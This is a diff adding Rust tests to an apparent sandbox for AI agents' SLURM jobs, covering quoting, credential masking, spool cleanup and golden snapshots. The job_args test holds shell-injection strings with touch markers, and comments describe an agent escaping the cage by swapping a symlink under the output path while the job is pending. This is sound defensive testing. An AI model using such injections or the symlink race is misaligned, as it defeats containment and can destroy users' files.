+            .filter(|l| l.contains("husk:") && !l.contains("srun") && !l.contains("stub=")
+                        && !l.contains("broker=") && !l.contains("slurmctld")
+                        && !l.contains("installed prefix")
+                        && !l.contains("job guard finished"))
+            .collect();
+        assert!(
+            about_failure.is_empty(),
+            "no husk commentary on a normal failure: {about_failure:?}"
+        );
+    }
+
+
+    #[test]
+    fn credential_mask_is_applied_only_for_paths_that_exist() {
+        // `--tmpfs DEST` kills bwrap when DEST is absent under a read-only root, and
+        // again when two entries resolve to the same dir (/var/run -> /run). Both bugs
+        // shipped and both took the whole cage down, so pin the conditional: the mask
+        // must appear for a directory that exists here and never for one that does not.
+        let (code, out, _err) =
+            run_guard_with_stub("mask", "#!/bin/bash\necho \"ARGS: $*\"\n");
+        assert_eq!(code, 0, "guard must run: {out}");
+
+        let mut expected = 0;
+        for d in settings::CREDENTIAL_SOCKET_DIRS {
+            let real = std::fs::canonicalize(d);
+            let present = real.is_ok();
+            if !present {
+                assert!(
+                    !out.contains(&format!("--tmpfs {d}")),
+                    "must not mask absent {d}: {out}"
+                );
+            } else {
+                expected += 1;
+            }
+        }
+        // De-duplication: /run/munge and /var/run/munge are the SAME directory, so at
+        // most one --tmpfs may be emitted however many list entries resolve to it.
+        let emitted = out.matches("--tmpfs ").count();
+        assert!(
+            emitted <= 1,
+            "resolved duplicates must collapse to one mount (saw {emitted}): {out}"
+        );
+        if expected == 0 {
+            assert_eq!(emitted, 0, "nothing exists here, so nothing to mask: {out}");
+        }
+    }
+
+    /// A5 cross-hop question (a). An agent-controlled `job_args` element is single-quoted by
+    /// `sh_quote` into the guard's `set -- '...'` line; the cage re-exec then runs
+    /// `exec /bin/bash "$_husk_body" "$@"`. Does a hostile element survive to the body as a
+    /// LITERAL positional argument, or can it break the single-quoting and inject a command —
+    /// the sharp case being an EMBEDDED NEWLINE? This drives the EXACT bytes `wrap_script`
+    /// emits for the hand-off through a real shell (both bash and dash) and asserts both
+    /// halves of the property at once:
+    ///   * every argument reaches the body byte-for-byte as submitted (literal survival), and
+    ///   * no injected `touch PWNED_*` ever runs (no break-out from the quoting).
+    #[test]
+    fn job_args_reach_the_body_as_literals_and_cannot_inject_a_command() {
+        use std::os::unix::fs::PermissionsExt;
+        // The reviewer's repertoire, plus the crux (a real embedded LF), a bare `'\''`
+        // sequence (the escape's own output, fed back), a leading-dash arg (which the `--`
+        // in `set --` must keep positional), and a tab.
+        let hostile: Vec<String> = [
+            "plain",
+            "with space",
+            "semi ; colon",
+            "amp && touch PWNED_AND",
+            "pipe | touch PWNED_PIPE",
+            "sub $(touch PWNED_CMDSUB)",
+            "tick `touch PWNED_TICK`",
+            "dollar $HOME ${PATH}",
+            "single ' quote",
+            "a'b'c",
+            "'\\''",
+            "double \" quote",
+            "back \\ slash",
+            "glob * ? [abc]",
+            "newline\ntouch PWNED_NEWLINE",
+            "tab\tafter",
+            "-rf",
+        ]
+        .iter()
+        .map(|s| s.to_string())
+        .collect();
+
+        let dir = std::env::temp_dir().join(format!("husk-jobargs-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+
+        // The REAL hand-off, produced by wrap_script from the hostile job_args.
+        let script = wrap_script(
+            BODY_PATH,
+            &hostile,
+            &[],
+            profile::Profile::SingleNode,
+            &dir.to_string_lossy(),
+            false,
+            &[dir.to_string_lossy().to_string()],
+            "", "",
+        );
+        const MARK: &str = "# --- hand off to the agent's script, inside the cage ---\n";
+        let handoff = script
+            .rsplit(MARK)
+            .next()
+            .filter(|h| *h != script)
+            .unwrap_or_else(|| panic!("no hand-off marker in the generated guard:\n{script}"));
+        assert!(
+            handoff.starts_with("set -- "),
+            "the argv line must lead the hand-off: {handoff:?}"
+        );
+        assert!(
+            handoff.trim_end().ends_with("exec /bin/bash \"$_husk_body\" \"$@\""),
+            "the body must be exec'd with the positional args: {handoff:?}"
+        );
+
+        // A body that records each positional argument NUL-delimited, so an embedded newline
+        // inside an argument can never be mistaken for the record separator.
+        let body = dir.join("body.sh");
+        let out = dir.join("argv.nul");
+        std::fs::write(
+            &body,
+            format!(
+                "#!/bin/bash\n: > \"{o}\"\nfor a in \"$@\"; do printf '%s\\0' \"$a\" >> \"{o}\"; done\n",
+                o = out.display()
+            ),
+        )
+        .unwrap();
+        std::fs::set_permissions(&body, std::fs::Permissions::from_mode(0o755)).unwrap();
+
+        for sh in ["/bin/bash", "/bin/sh"] {
+            let _ = std::fs::remove_file(&out);
+            // The guard's own binding of the body path (line `_husk_body={body_q}`), then the
+            // generated hand-off verbatim — nothing else.
+            let runner = format!(
+                "_husk_body={}\n{}",
+                settings::sh_quote(&body.to_string_lossy()),
+                handoff
+            );
+            let st = std::process::Command::new(sh)
+                .arg("-c")
+                .arg(&runner)
+                .current_dir(&dir)
+                .status()
+                .unwrap();
+            assert!(st.success(), "hand-off must run cleanly under {sh}");
+
+            let raw = std::fs::read(&out).unwrap();
+            let mut recs: Vec<&[u8]> = raw.split(|b| *b == 0).collect();
+            assert_eq!(
+                recs.pop(),
+                Some(&b""[..]),
+                "records are NUL-terminated, so the split's tail must be empty under {sh}"
+            );
+            let got: Vec<String> =
+                recs.iter().map(|r| String::from_utf8_lossy(r).into_owned()).collect();
+            assert_eq!(
+                got, hostile,
+                "every job_arg must reach the body as a byte-for-byte literal under {sh}"
+            );
+
+            for marker in
+                ["PWNED_AND", "PWNED_PIPE", "PWNED_CMDSUB", "PWNED_TICK", "PWNED_NEWLINE"]
+            {
+                assert!(
+                    !dir.join(marker).exists(),
+                    "INJECTION under {sh}: the guard's set-- quoting let a job_arg run `{marker}`"
+                );
+            }
+        }
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// **A1's run-time half.** The submit-time check refuses an `--output` whose leaf is a
+    /// symlink *at submission*; it cannot refuse one that becomes a symlink while the job
+    /// sits PENDING, and husk cannot make slurmd's `open()` use `O_NOFOLLOW`. So the guard
+    /// asks the question again at the only moment that cannot be raced: after the file is
+    /// already open, before the agent's body is a process.
+    ///
+    /// This drives the REAL generated guard through a real shell with stdout redirected to
+    /// a file — which is precisely what slurmd does to a batch script — and asserts both
+    /// directions, because a check that only ever says no is a denial of service and a
+    /// check that only ever says yes is decoration.
+    #[test]
+    fn a_hijacked_stdout_stops_the_job_before_the_agents_body_runs() {
+        use std::os::unix::fs::PermissionsExt;
+        let dir = std::env::temp_dir().join(format!("husk-fdguard-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        let inside = dir.join("project");
+        let elsewhere = dir.join("elsewhere");
+        std::fs::create_dir_all(&inside).unwrap();
+        std::fs::create_dir_all(&elsewhere).unwrap();
+        let home = dir.join("home");
+        std::fs::create_dir_all(&home).unwrap();
+
+        // Stands in for seccomp-wrapper, i.e. for everything downstream of the check. If
+        // this marker reaches the output file, the guard let the job proceed.
+        let stub = dir.join("seccomp-wrapper");
+        std::fs::write(&stub, "#!/bin/bash\necho MARKER_BODY_RAN\n").unwrap();
+        std::fs::set_permissions(&stub, std::fs::Permissions::from_mode(0o755)).unwrap();
+
+        let root = inside.to_string_lossy().to_string();
+        let script = wrap_script(
+            BODY_PATH,
+            &[],
+            &[],
+            profile::Profile::SingleNode,
+            &root,
+            false,
+            std::slice::from_ref(&root),
+            "", "",
+        );
+        let path = dir.join("job.sh");
+        std::fs::write(&path, &script).unwrap();
+
+        let run = |out_file: &std::path::Path| -> (i32, String) {
+            let f = std::fs::File::create(out_file).unwrap();
+            let st = std::process::Command::new("/bin/bash")
+                .arg(&path)
+                .current_dir(&inside)
+                .env("HOME", &home)
+                .env("PATH", format!("{}:/usr/bin:/bin", dir.display()))
+                .stdout(std::process::Stdio::from(f))
+                .stderr(std::process::Stdio::piped())
+                .status()
+                .unwrap();
+            (st.code().unwrap_or(-1), std::fs::read_to_string(out_file).unwrap_or_default())
+        };
+
+        // 1. The honest job: stdout lands inside the writable set, so it runs.
+        let (code, body) = run(&inside.join("slurm-1.out"));
+        assert_eq!(code, 0, "a job writing inside the writable set must still run: {body}");
+        assert!(body.contains("MARKER_BODY_RAN"), "the body must be reached: {body}");
+
+        // 2. The escape: stdout lands OUTSIDE it — what the agent gets by swapping a
+        // symlink under the already-validated `--output` while the job is pending. The job
+        // must die before the body runs, and the target must receive NONE of its bytes.
+        let hijacked = elsewhere.join("VICTIM");
+        let (code, body) = run(&hijacked);
+        assert_eq!(code, 1, "a job whose stdout escaped the writable set must be refused");
+        assert!(
+            !body.contains("MARKER_BODY_RAN"),
+            "the agent's body ran anyway — its output reached a file outside the cage: {body}"
+        );
+
+        // 3. The refusal is REPORTED, and reported where the job cannot rewrite it: husk's
+        // own log under $HOME, which the cage tmpfs-masks. A silent abort here would look
+        // exactly like a node failure, and this is the one event that must not be guessed at.
+        let logdir = home.join(".husk/log");
+        let logs: String = std::fs::read_dir(&logdir)
+            .expect("husk must keep a job log")
+            .filter_map(|e| std::fs::read_to_string(e.unwrap().path()).ok())
+            .collect();
+        assert!(logs.contains("JOB REFUSED"), "the refusal must be recorded: {logs}");
+        assert!(
+            logs.contains(&hijacked.to_string_lossy().to_string()),
+            "the record must name the descriptor's real destination: {logs}"
+        );
+        // The victim file itself may hold husk's refusal text but never the job's own — and
+        // `--open-mode=append` means whatever was in it is still there.
+        assert!(!std::fs::read_to_string(&hijacked).unwrap().contains("MARKER_BODY_RAN"));
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn output_files_are_opened_append_so_a_swapped_target_cannot_be_truncated() {
+        // The other half of the pending-window defence, and the one that protects a file
+        // husk never gets to inspect. Under SLURM's default `truncate`, slurmd opens the
+        // (swapped) target with O_TRUNC and empties it before a single line of husk's runs
+        // — an unconditional destroy primitive aimed at any file the user can write, and
+        // one no in-job check can undo. `append` leaves nothing to destroy.
+        //
+        // Asserted on the emitted OPTIONS, not on a comment: this is a property of what
+        // reaches sbatch's command line.
+        let opts = opts_in(work(), req(&["--partition=preemptible"], "echo hi\n"), &no_uenv());
+        assert!(has(&opts, "--open-mode=append"), "husk must force append mode: {opts:?}");
+        // And the agent must not be able to put a second, later `--open-mode` on the line:
+        // sbatch takes the last one, so an option husk emits must be one the agent cannot.
+        let spec = sbatch::REGISTRY
+            .iter()
+            .find(|s| s.long == "--open-mode")
+            .expect("--open-mode must be in the registry, not merely unknown");
+        assert_eq!(
+            spec.class,
+            sbatch::Class::Forced,
+            "--open-mode decides whether a hijacked output file gets truncated: broker-owned"
+        );
+    }
+
+    #[test]
+    fn guard_bootstraps_the_step_pair() {
+        let script = wrap_script(BODY_PATH, &[], &[], profile::Profile::SingleNode, "/work", false, &["/work".to_string()], "", "");
+        // An UN-CAGED step-broker: it needs exactly the MUNGE + daemon route the cage
+        // removes, which is why it starts before the re-exec and not inside it.
+        assert!(script.contains("--step-broker --spool"), "{script}");
+        assert!(script.contains("export HUSK_STEP_SPOOL="), "the stub finds the spool by env: {script}");
+        // The in-cage stub shadows the real srun, resolved on THIS node.
+        assert!(script.contains("_husk_real_srun=$(command -v srun"), "{script}");
+        // THE RANK CAGE FOLLOWS THE SESSION WORKDIR, NOT $PWD. These were the same thing
+        // while --chdir was forced to req.cwd; once a run script may start the job in a
+        // subdirectory they diverge, and using $PWD would silently narrow the rank cage's
+        // writable region to that subdirectory. ICON starts in <case>/run and writes into
+        // <case>/experiments, so with $PWD those writes fail and nothing says why.
+        assert!(
+            script.contains("--workdir '/work'") || script.contains("--workdir /work"),
+            "the step-broker must be given the validated workdir: {script}"
+        );
+        assert!(
+            !script.contains("--workdir \"$PWD\""),
+            "the rank cage must not follow the job's chdir: {script}"
+        );
+        assert!(script.contains("--ro-bind"), "{script}");
+        // It holds credentials the job must not have, so it dies with the job.
+        assert!(script.contains("kill \"$_husk_step_pid\""), "{script}");
+        // ...and every piece is conditional on existing here, because the paths were
+        // resolved on the login node and a bind with a missing source kills the cage.
+        assert!(script.contains("if [ -r "), "{script}");
+    }
+
+    /// Every `"$<var>/<name>"` literal in a generated script, i.e. every file the guard
+    /// puts in one of the directories it creates.
+    fn files_created_under(script: &str, var: &str) -> std::collections::BTreeSet<String> {
+        let mut names = std::collections::BTreeSet::new();
+        let needle = format!("${var}/");
+        for (_, rest) in script.match_indices(&needle).map(|(i, _)| {
+            (i, &script[i + needle.len()..])
+        }) {
+            let name: String = rest
+                .chars()
+                .take_while(|c| c.is_ascii_alphanumeric() || *c == '.' || *c == '-' || *c == '_')
+                .collect();
+            if !name.is_empty() {
+                names.insert(name);
+            }
+        }
+        names
+    }
+
+    // The step spool is created in the user's working directory, so a job that leaves one
+    // behind turns an active project into a litter tray. The cleanup removes files by
+    // exact name and then rmdir-s, which is the safe design — and precisely the design
+    // that fails SILENTLY when a new feature adds a file nobody added to the list: rmdir
+    // just fails and the directory stays. Egress did exactly that (net.sock, socat,
+    // net-proxy.log), so every networked job leaked a spool.
+    //
+    // This asserts the property rather than the list: whatever the guard creates in a
+    // directory of its own, the cleanup must name. Both directories, because the egress
+    // socket moved into a second one and the same trap applies there.
+    #[test]
+    fn every_file_the_guard_creates_in_its_own_directories_is_cleaned_up() {
+        for net in [false, true] {
+            let script = wrap_script(
+                BODY_PATH,
+                &[],
+                &[],
+                profile::Profile::SingleNode,
+                "/work",
+                net,
+                &["/work".to_string()],
+                "", "",
+            );
+            // Everything from the cleanup marker to the end of the guard: the step spool
+            // block and the egress-directory block both live in there.
+            let block = script
+                .split_once("# --- husk: cleanup ---")
+                .map(|(_, rest)| rest.split_once("if [ \"$_husk_rc\"").map(|(c, _)| c).unwrap_or(rest))
+                .unwrap_or_else(|| panic!("no marked cleanup block in the guard:\n{script}"));
+            // CODE ONLY. The first version of this test searched the whole block, and the
+            // comment explaining the net.sock leak contains the string "net.sock" — so the
+            // test passed against a cleanup that had stopped removing it. A test that can be
+            // satisfied by prose is not testing anything.
+            let cleanup: String = block
+                .lines()
+                .filter(|l| !l.trim_start().starts_with('#'))
+                .collect::<Vec<_>>()
+                .join("\n");
+            // THE OTHER PRODUCER. This test used to derive names only from the generated
+            // shell, so it covered what the GUARD creates and silently ignored what the
+            // step-broker (Rust) writes into the same directory: `out-<id>` and `err-<id>`,
+            // the captured stdout/stderr of every srun step. Those were never removed, so
+            // rmdir failed and EVERY job that ran a step kept its spool — 16 of them in one
+            // review session (2026-08-01), reported as "it holds files husk did not create"
+            // when husk had created them.
+            //
+            // A completeness test must cover the DIRECTORY, not one writer of it. Scanning
+            // step.rs for the paths it builds is crude, but it fails loudly when a new file
+            // appears, which is the property that was missing.
+            //
+            // IT NO LONGER SKIPS WHAT IT CANNOT READ, and that is the fix `B4-2`/`D1 §6`
+            // asked for. The old scanner took the characters before the first `{`, and
+            // anything it could not parse fell through a `continue` or matched by accident:
+            //   * `format!("{}-audit", id)`  -> empty name -> `continue`, silently passing
+            //   * `format!(".{}.tmp", HB)`   -> name "." -> `cleanup.contains(".")` is
+            //     trivially true of any cleanup line, so a REAL leak passed 328/328
+            //   * `join("audit.txt")`        -> not a `format!` at all -> never even seen
+            // Now every `spool.join(` site must produce a name this test can READ and match
+            // against a glob the guard actually emits; one it cannot read is a hole exactly
+            // the size of the last three bugs, so it panics with what to do (`P5`, `P7`).
+            let step_rs = include_str!("step.rs");
+            // The constants step.rs joins by name. Two entries, and a third one has to be
+            // added here rather than being skipped — that is the point.
+            let named: [(&str, &str); 2] = [
+                ("Self::HEARTBEAT_TMP", crate::step::StepBroker::HEARTBEAT_TMP),
+                ("Self::HEARTBEAT", crate::step::StepBroker::HEARTBEAT),
+            ];
+            let globs = crate::step::step_spool_globs();
+            // A site gives us either the WHOLE name (a literal or a named constant) or the
+            // literal text either side of the placeholders — `resp-{id}.json` is
+            // ("resp-", ".json"). A glob covers a whole name the way the shell would; it
+            // covers a fragmentary one when its own fixed halves sit inside the fragments.
+            // Both halves, never just the prefix: prefix-only would bless a `resp-<id>.txt`
+            // that `resp-*.json` cannot remove.
+            let matched = |head: &str, tail: &str, whole: bool| {
+                globs.iter().any(|g| match (g.split_once('*'), whole) {
+                    (Some((p, suf)), true) => {
+                        head.len() >= p.len() + suf.len()
+                            && head.starts_with(p)
+                            && head.ends_with(suf)
+                    }
+                    (Some((p, suf)), false) => head.starts_with(p) && tail.ends_with(suf),
+                    (None, true) => g == head,
+                    (None, false) => g.starts_with(head) && g.ends_with(tail),
+                })
+            };
+            for (i, _) in step_rs.match_indices("spool.join(") {
+                let rest = &step_rs[i + "spool.join(".len()..];
+                // (text before the first placeholder, text after the last, is-it-the-whole-name)
+                let (name, tail, whole): (String, String, bool) = if let Some(f) = rest.strip_prefix("format!(\"") {
+                    let lit: String = f.chars().take_while(|c| *c != '"').collect();
+                    let head = lit.split('{').next().unwrap_or("").to_string();
+                    let tail = lit.rsplit('}').next().unwrap_or("").to_string();
+                    match lit.contains('{') {
+                        true => (head, tail, false),
+                        false => (lit, String::new(), true),
+                    }
+                } else if let Some(l) = rest.strip_prefix('"') {
+                    (l.chars().take_while(|c| *c != '"').collect(), String::new(), true)
+                } else if let Some((_, v)) = named.iter().find(|(k, _)| rest.starts_with(k)) {
+                    (v.to_string(), String::new(), true)
+                } else {
+                    panic!(
+                        "step.rs builds a step-spool path this test cannot read:\n  \
+                         spool.join({}…)\n\
+                         Give it a literal name, or name the constant in `named` above. Do \
+                         not leave it unreadable: a file the cleanup cannot match leaks the \
+                         whole spool on every job that writes one.",
+                        &rest[..rest.len().min(40)]
+                    );
+                };
+                assert!(
+                    name.len() >= 3,
+                    "step.rs builds a step-spool path whose literal prefix is {name:?} — a \
+                     format string that STARTS with a placeholder tells this test nothing, \
+                     and that blind spot is how `.{{}}.tmp` and `{{}}-audit` walked past it. \
+                     Put the distinguishing text first, or use a named constant."
+                );
+                assert!(
+                    matched(&name, &tail, whole),
+                    "step.rs writes '{name}…{tail}' into the step spool but no glob in \
+                     `step::step_spool_globs()` matches it, so the guard's generated cleanup \
+                     cannot remove it, rmdir fails, and the job leaves its spool behind with \
+                     \"it still holds\" — about a file husk wrote.\n\
+                     --- globs ---\n{globs:?}"
+                );
+                // …and the glob that covers it is actually IN the emitted shell. The list is
+                // generated, so this is the tie between the Rust and the artifact (`P8`).
+                assert!(
+                    globs.iter().any(|g| cleanup.contains(g.as_str())),
+                    "--- cleanup block ---\n{cleanup}"
+                );
+            }
+
+            for var in ["_husk_spool", "_husk_net_dir"] {
+                for name in files_created_under(&script, var) {
+                    // A glob in the cleanup covers the family it matches.
+                    let covered = cleanup.contains(&name)
+                        || name
+                            .split_once('-')
+                            .is_some_and(|(p, _)| cleanup.contains(&format!("{p}-*")));
+                    assert!(
+                        covered,
+                        "the guard creates '{name}' in ${var} but the cleanup never removes \
+                         it, so rmdir fails and the directory is left behind (net={net})\n\
+                         --- cleanup block ---\n{cleanup}"
+                    );
+                }
+            }
+        }
+    }
+
+    // ---- golden output: the guard as a readable artifact -----------------------------
+    //
+    // The guard is ~180 lines of shell assembled from Rust string literals, so a
+    // one-character change to it produces a diff nobody can read AS SHELL. That is a tax on
+    // exactly the file that most needs review, and it is why every guard bug so far
+    // (`{socat_q}` leaking literally, the srun bind shipping with literal quotes,
+    // `_husk_broker` used before assignment) was invisible until hardware ran it.
+    //
+    // Snapshotting the emitted script fixes the reviewability half: any change to the guard
+    // now shows up in `git diff` as a diff of the actual program that runs on the compute
+    // node. It is also the oracle that would make a future rewrite (see the deferred typed
+    // builder) checkable rather than an act of faith — "prove the bytes are identical".
+    //
+    // Regenerate deliberately, never casually:  HUSK_UPDATE_GOLDEN=1 cargo test
+    // and READ the resulting diff — it is the whole point of the file.
+
+    /// The three paths husk resolves from its own install location; they differ per machine
+    /// and per build, so they are normalised out before comparing.
+    fn normalized_guard(net: bool) -> String {
+        // `RAB3-B3`, and the lock is the whole fix. `BROKER_OVERRIDE` is process-global and
+        // cargo runs tests as THREADS OF ONE PROCESS, so its setter
+        // (`run_guard_with_stub_ex`) holds `STUB_PATH_LOCK` — its docstring at the static
+        // even says "always under `STUB_PATH_LOCK`". This function is a READER, and it reads
+        // the override TWICE: once inside `wrap_script` -> `husk_paths`, and once directly
+        // through `husk_paths()` below, to build the substitution list. Unlocked, a
+        // concurrent setter lands between the two reads; the script then carries one broker
+        // path while the substitution list names another, `<HUSK_BROKER>` never appears, and
+        // the golden tests fail on a machine where nothing is wrong.
+        //
+        // A lock that covers the writer and not the reader is not a lock (`P3`: validation is
+        // not enforcement — the check ran, the property it was meant to hold did not). Cost
+        // measured at `5dddfc0`: `cargo test --release --locked`, which IS the gate
+        // `build-release.sh` runs, failed 6 runs out of 6 here on
+        // `the_golden_guard_is_the_real_script_with_only_paths_normalised`;
+        // `-- --test-threads=1` was 0/6, which is the signature of a harness race rather
+        // than a husk bug. A release gate that is a coin flip is worse than no gate: it
+        // teaches the operator to re-run a red result instead of reading it (`P9`).
+        let _serialise = STUB_PATH_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        // The REAL cage arguments, not a synthetic stand-in. The first version of this
+        // passed a hand-written four-element list, so the snapshot covered the guard's
+        // control flow while the mount table — the actual enforcement boundary — could
+        // change underneath it without moving the file. Adding --unshare-pid was invisible
+        // to it, which is how I noticed.
+        let script = wrap_script(
+            BODY_PATH,
+            &[],
+            &FsPolicy::unchecked_for_test().compute_bwrap_args("/work/project"),
+            profile::Profile::SingleNode,
+            "/work/project",
+            net,
+            &["/work/project".to_string(), "/scratch/shared".to_string()],
+            // Real emitted paths, so the goldens PIN the A1-F1 name check rather than the
+            // empty-skip branch. A leaf with a specifier (%j) and a literal directory is the
+            // production shape.
+            "/work/project/slurm-%j.out",
+            "/work/project/slurm-%j.err",
+        );
+        let (broker, stub, socat) = husk_paths();
+        // Longest first: the three share a prefix, and replacing a shorter one first would
+        // corrupt the others.
+        let mut subs = [(broker, "<HUSK_BROKER>"), (stub, "<HUSK_STUB>"), (socat, "<HUSK_SOCAT>")];
+        subs.sort_by_key(|(p, _)| std::cmp::Reverse(p.len()));
+        let mut out = script;
+        for (path, placeholder) in subs {
+            if !path.is_empty() {
+                out = out.replace(&path, placeholder);
+            }
+        }
+        out
+    }
+
+    fn check_golden(name: &str, actual: &str) {
+        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/golden").join(name);
+        if std::env::var_os("HUSK_UPDATE_GOLDEN").is_some() {
+            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+            std::fs::write(&path, actual).unwrap();
+            return;
+        }
+        let expected = std::fs::read_to_string(&path).unwrap_or_else(|e| {
+            panic!("cannot read {}: {e}\nrun: HUSK_UPDATE_GOLDEN=1 cargo test", path.display())
+        });
+        if expected != actual {
+            // Point at the first differing line: the whole script is too long to eyeball.
+            let (mut le, mut la) = (expected.lines(), actual.lines());
+            let mut n = 0;
+            loop {
+                n += 1;
+                match (le.next(), la.next()) {
+                    (Some(a), Some(b)) if a == b => continue,
+                    (a, b) => panic!(
+                        "the generated guard changed and {} was not updated.\n\
+                         first difference at line {n}:\n  golden: {:?}\n  actual: {:?}\n\n\
+                         If the change is intended: HUSK_UPDATE_GOLDEN=1 cargo test, then \
+                         READ the diff — this file is the program that runs on the compute node.",
+                        path.display(),
+                        a.unwrap_or("<end of file>"),
+                        b.unwrap_or("<end of file>"),
+                    ),
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn the_banner_lists_both_bind_forms_of_a_dev_null_mask() {
+        // N8: the banner's masked list must name every path that reads empty or refuses, and
+        // husk uses TWO bind forms — `--ro-bind /dev/null` for credential-named files and
+        // `--ro-bind-try /dev/null` for the auto-exec masks. Matching only the first left
+        // `.git/hooks`/`.hg/hgrc` masked but unlisted: the banner claimed completeness it did
+        // not have.
+        let args = vec![
+            "--ro-bind".into(), "/dev/null".into(), "/work/.vscode".into(),
+            "--ro-bind-try".into(), "/dev/null".into(), "/work/.git/hooks".into(),
+            "--ro-bind".into(), "/etc".into(), "/etc".into(), // a real bind, not a mask
+        ];
+        let masked = super::masked_credentials(&args);
+        assert!(masked.iter().any(|m| m == "/work/.vscode"), "the --ro-bind mask must be listed");
+        assert!(
+            masked.iter().any(|m| m == "/work/.git/hooks"),
+            "the --ro-bind-try mask must ALSO be listed (N8): {masked:?}"
+        );
+        assert!(!masked.iter().any(|m| m == "/etc"), "a real bind is not a mask");
+    }
+
+    /// The guard checks the emitted output paths by NAME, not only by fd — A1-F1.
+    ///
+    /// The demonstrated escape swapped an absent `--output` leaf to a symlink while the job
+    /// was pending; slurmd followed it at open time, outside the cage. The fd check could not
+    /// see it because slurmstepd hands the batch script a pipe. This asserts the name-based
+    /// backstop is generated, refuses on a symlink, and resolves the directory at run time —
+    /// the behaviour was executed against the real exploit in a shell harness; this pins that
+    /// the generator emits it.
+    #[test]
+    fn the_guard_names_the_output_paths_it_emitted() {
+        let script = wrap_script(
+            BODY_PATH, &[], &FsPolicy::unchecked_for_test().compute_bwrap_args("/work"),
+            profile::Profile::SingleNode, "/work", false,
+            &["/work".to_string()],
+            "/work/slurm-%j.out", "/work/slurm-%j.err",
+        );
+        // The emitted paths are checked by name.
+        assert!(script.contains("_husk_name_bad"), "no name check emitted");
+        assert!(script.contains("'/work/slurm-%j.out'"), "output path not baked in: {script}");
+        assert!(script.contains("'/work/slurm-%j.err'"), "error path not baked in");
+        // A symlinked leaf is the refusal condition (`-h`), a HARD-LINKED leaf is refused by
+        // its link count (N1), and the directory is resolved.
+        assert!(script.contains("[ -h \"$_husk_leaf\" ]"), "leaf symlink not tested");
+        assert!(script.contains("stat -c %h \"$_husk_leaf\""), "leaf hard-link (nlink) not tested");
+        assert!(script.contains("readlink -f \"$_husk_nd\""), "output dir not resolved at run time");
+        assert!(script.contains("JOB REFUSED"), "no refusal path");
+
+        // With no emitted paths (the direct-call test shape) the block is skipped, not emitted
+        // empty — an empty loop over nothing would be dead shell in every job.
+        let none = wrap_script(
+            BODY_PATH, &[], &[], profile::Profile::SingleNode, "/work", false,
+            &["/work".to_string()], "", "",
+        );
+        assert!(!none.contains("_husk_name_bad"), "empty out/err must skip the name check");
+    }
+
+    /// **`K-2`.** The MUNGE mask has TWO enforcers, and they must take the same decision
+    /// about the same node — so this **executes both** and compares them.
+    ///
+    /// `profile.rs` names this mount as the load-bearing control for the only shipped
+    /// profile: `SingleNode` adds no seccomp rules, so the MUNGE socket is kept out of a
+    /// caged process by this mount and by nothing else. It is applied in `policy::wrap_script`
+    /// for the job cage and in `rank::wrap_command` for each rank (bwrap mount namespaces do
+    /// not propagate, so a rank inherits nothing). Fix `K` made the rank REFUSE when the mask
+    /// cannot be applied and left the guard at `[ -d ] || continue`, so one node
+    /// configuration produced a refusal in one enforcer and a silently unmasked job cage in
+    /// the other — `RJMK`'s `K-2`, undisclosed by that fix.
+    ///
+    /// Neither half is checked by reading. Both slices are pulled out of the REAL generated
+    /// scripts, including the refusal blocks after `done`, and driven against one controlled
+    /// tree: the guard under `bash` (it builds a bash array and the job script's shebang is
+    /// `#!/bin/bash`), the rank under `bash` **and** `/bin/sh`, which is `B3`'s established
+    /// method for this file.
+    ///
+    /// **The two arms where they must agree**, because neither enforcer can mask the path:
+    /// present-but-not-a-directory (refuse) and absent (silent skip — `--tmpfs` on an absent
+    /// DEST is what took the whole cage down twice, so a refusal here would be the bug).
+    ///
+    /// **The one arm where they legitimately differ**, asserted rather than left to be
+    /// rediscovered: a path resolving through WHITESPACE. `_husk_extra` is a bash array so
+    /// the guard masks it correctly; the rank concatenates into `$_m` and expands it
+    /// unquoted, so it refuses. Making the guard refuse too would be husk denying a job whose
+    /// cage it can build. The guard therefore masks it AND announces the consequence — this
+    /// test pins that, so "fixing" the divergence later is a red test and a decision rather
+    /// than an edit.
+    ///
+    /// **Mutations that turn it red.** Restoring `[ -d "$_d" ] || continue` in the guard:
+    /// `not_a_directory` diverges (guard 0, rank 1). Deleting the guard's
+    /// `if [ -n "$_husk_mwhy" ]` block: same. Making the guard's absent arm refuse:
+    /// `only_absent` diverges the other way. Deleting the whitespace announcement: the
+    /// divergence arm goes red with the message assertion.
+    ///
+    /// **Axes it does not cover.** (1) It substitutes a controlled path list, so it says
+    /// nothing about the real `/run/munge` — that is
+    /// `credential_mask_list_is_a_fixed_root_owned_constant_no_rank_can_influence` for the
+    /// name and `selftest.sh`'s `cred.munge` probe for whether bwrap then really mounts a
+    /// tmpfs, which only hardware answers. (2) It runs the guard slice under `bash` only;
+    /// the guard is not POSIX shell and is not meant to be. (3) The empty-resolution arm is
+    /// unreachable from a test — `readlink -f` cannot be made to print nothing for an
+    /// existing directory — so that arm is asserted to EXIST in both scripts, not executed.
+    /// (4) It compares the two enforcers' dispositions, not what `srun` or `slurmstepd` do
+    /// with a non-zero exit.
+    #[test]
+    fn the_two_credential_mask_enforcers_agree_on_a_path_neither_can_mask() {
+        use std::os::unix::fs::symlink;
+
+        let _serialise = STUB_PATH_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let dir = std::env::temp_dir().join(format!("husk-jk2-mask-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        let plain = dir.join("plain");
+        let spaced = dir.join("spaced dir");
+        std::fs::create_dir_all(&plain).unwrap();
+        std::fs::create_dir_all(&spaced).unwrap();
+        symlink(&plain, dir.join("link_dup")).unwrap();
+        symlink(&spaced, dir.join("link_space")).unwrap();
+        std::fs::write(dir.join("notdir"), b"not a directory\n").unwrap();
+        let real_plain =
+            std::fs::canonicalize(&plain).unwrap().to_string_lossy().into_owned();
+
+        // The list BOTH generators iterate, read from the one constant they share, so this
+        // test cannot drift from either of them (`M-4`: the path list was already one
+        // definition; after `K-2` the DISPOSITION is too).
+        let loop_head = crate::settings::CREDENTIAL_SOCKET_DIRS.join(" ");
+
